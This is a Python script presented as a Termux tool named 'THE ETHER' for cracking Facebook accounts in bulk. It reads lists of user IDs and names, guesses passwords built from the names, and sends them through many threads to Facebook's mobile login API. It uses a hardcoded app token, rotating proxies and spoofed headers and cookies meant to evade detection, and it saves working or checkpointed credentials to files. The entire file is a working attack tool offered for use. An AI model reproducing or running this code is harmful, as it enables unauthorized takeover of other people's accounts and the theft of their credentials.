import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
 
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install dnslib pypi')
	os.system('pip install requests bs4 futures==2 > /dev/null')

# Add missing global variables
oks = []
cps = []
loop = 0
cpc = 0
okc = 0

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)

# COLORS
x = '\33[m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
K = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

try:
    ip = requests.get('https://api.ipify.org').text.strip()
    loc = requests.get('https://api.iplocation.net/?cmd=ip-country&ip=' + ip, headers={'Referer': 'https://api.iplocation.net/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
except:
    ip = "Unknown"
    loc = "Unknown"
    

agents =[
    'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser',
    'Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
    ]

header = {
    'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)), 
    'x-fb-sim-hni': str(random.randint(20000, 40000)), 
    'x-fb-net-hni': str(random.randint(20000, 40000)), 
    'x-fb-connection-quality': 'EXCELLENT', 
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBSV/5.1.1;]'
}

randomgents = random.choice(agents)
		
headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': randomgents, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			
# Enhancement 2: Proxy list (add your proxies here if you have them)
proxies_list = [
    # Add your proxies here like:
    {'http': 'http://156.38.112.11:80'},
    {'http': 'http://197.255.126.69:80'},
    {'http': 'http://41.74.91.244:80'},
    {'http': 'http://102.90.93.170:8080'},
    {'http': 'http://197.211.45.4:10000'},
    {'http': 'http://41.216.160.138:8082'},
]

user_agent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", 
    "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
]

def linex():
    os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')

def logo():
   os.system('echo "\n\t ╔═══╗╔═══╗╔═══╗╔═╗╔═╗ \n\t ╚╗╔╗║║╔═╗║║╔══╝╚╗╚╝╔╝ \n\t  ║║║║║╚═╝║║╚══╗ ╚╗╔╝  \n\t  ║║║║║╔╗╔╝║╔══╝ ╔╝╚╗  \n\t ╔╝╚╝║║║║╚╗║╚══╗╔╝╔╗╚╗ \n\t ╚═══╝╚╝╚═╝╚═══╝╚═╝╚═╝ \n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { THE  ETHER }   ║\n    ║ AUTHOR   : Chidexzy         ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	

def main():
    os.system("clear")
    logo()
    print("\t\033[93;1m      MAIN MENU\x1b[0m")
    print("")
    print("\033[92;1m  [1] CRACK FILE")
    print("\033[94;1m  [2] UPDATE TOOL 06.10")
    print("\033[96;1m  [3] CHAT ME UP ON WHATSAPP \033[92;1m✘\033[91;1m✘")
    print("\033[90;1m  [0] EXIT")
    print("")
    log_sel()

def log_sel():
    sel = input("\033[93;1m  CHOOSE: \033[92;1m")
    if sel == "":
        print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
        log_sel()
    elif sel == "1" or sel == "01":
        files()
    elif sel == "2" or sel == "02":
        try:
            os.system("rm -rf ether ; git clone https://github.com/chidexzy/ether ; cd ether ; cp ether /data/data/com.termux/files/home/ether ; cd ; cd ether ; rm -rf ether")
            xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL 👍\n")
            os.system("python ether")
        except KeyboardInterrupt:
            print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
            main()
    elif sel == "3" or sel == "03":
        try:
            subprocess.check_output(["am", "start", "https://wa.me/qr/BLRFNOUYDCRPO1"])
        except:
            print("\033[91;1m\n WhatsApp link failed to open\n")
        main()
    elif sel == "0" or sel == "00":
        xox("\n\t\033[91;1m YOUR FATHER!!! 🖕😅")
        sys.exit()
    else:
        print("")
        print("\t\033[91;1m  SELECT VALID OPTION")
        print("")
        log_sel()

def files():
    global oks, cps
    os.system("clear")
    logo()
    print("")
    file = input(' Put file path\033[1;37m: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' File location not found ')
        time.sleep(1)
        os.system('clear')
        files()
        return
    
    plist = []
    try:
        os.system('clear')
        logo()
        print(' Example : 1 , 2 ,3, 4 ,5 ,6 ,7 ,8, 9 ,****,Etc')
        ps_limit = int(input(' Put pass limit : '))
    except:
        ps_limit = 1
    
    os.system('clear')
    logo()
    print(' Example : first last,firstlast,first12345,***Etc')
    for i in range(ps_limit):
        plist.append(input(f' Put password {i+1}: '))
    
    with tred(25) as crack_submit:
        os.system('clear')
        logo()
        total_ids = str(len(fo))
        print(' Total Accounts   : '+total_ids)
        print(' \x1b[1;91mUse Flight Mode If No Results')
        for user in fo:
            try:
                ids, names = user.split('|')
                passlist = plist
                crack_submit.submit(ffb,ids,names,passlist)
            except ValueError:
                print(f' Invalid format in line: {user}')
                continue
    
    print('\033[1;37m')
    print(' The process has completed')
    print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    input(' Press enter to back ')
    os.system('python2 ether')

def ffb(ids, names, passlist):
    global loop, oks, cps, okc, cpc
    loop += 1
    sys.stdout.write('\r\x1b[1;97m[\033[1;97mCracking\033[1;97m] %s |\x1b[1;92mOK:- %s \x1b[1;97m\r'%(loop,len(oks)))
    sys.stdout.flush()
    vaugent = random.choice(agents)
    session = requests.Session()
    # Enhanced headers to avoid detection
    session.headers.update({
        'User-Agent': vaugent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none'
    })
    
    # Enhancement 4: Add session cookies to look more realistic
    session.cookies.update({
        'locale': 'en_US',
        'datr': f'random_datr_{random.randint(100000, 999999)}',
        'sb': f'random_sb_{random.randint(100000, 999999)}'
    })

    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

            # Enhancement 2: Proxy rotation (if you have proxies)
            proxy = random.choice(proxies_list)

            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+ids+"&password="+pas+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_, proxies=proxy).text
            q = json.loads(data)
            if "c_user" in json.dumps(q).lower():
                print(" \033[1;32m[EXCELLENT] "+ids+" | "+pas+" | "+proxy+"\033[0;97m")
                okc+=1
                ok = open("/storage/emulated/0/ether_ok.txt", "a")
                ok.write(ids+"|"+pas+"\n")
                ok.close()
                oks.append(ids+pas)
            else:
                if "verify" in json.dumps(q).lower():
                    print("\r \033[1;33m[CHECKPOINT] "+ids+" | "+pas+" | "+proxy+"\033[0;97m")
                    cpc+=1
                    cp = open("/storage/emulated/0/ether_cp.txt", "a")
                    cp.write(ids+"|"+pas+"\n")
                    cp.close()
                    cps.append(ids+pas)
            pass
    except Exception as e:
        pass

# Start the program
if __name__ == "__main__":
    main()
